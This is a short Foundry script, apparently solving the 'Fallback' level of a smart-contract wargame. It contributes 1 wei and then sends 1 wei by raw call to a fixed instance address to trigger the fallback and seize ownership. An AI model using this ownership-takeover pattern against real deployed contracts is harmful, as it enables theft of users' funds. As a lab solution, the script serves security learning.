pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    // instance id: 0x81376dC00af52379eC92aa7Ad9Acf9A58953C0c7
    Fallback public fb = Fallback(payable(0x81376dC00af52379eC92aa7Ad9Acf9A58953C0c7));

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        fb.contribute{value: 1 wei}();
        payable(0x81376dC00af52379eC92aa7Ad9Acf9A58953C0c7).call{value: 1 wei}("");
        vm.stopBroadcast();
    }
}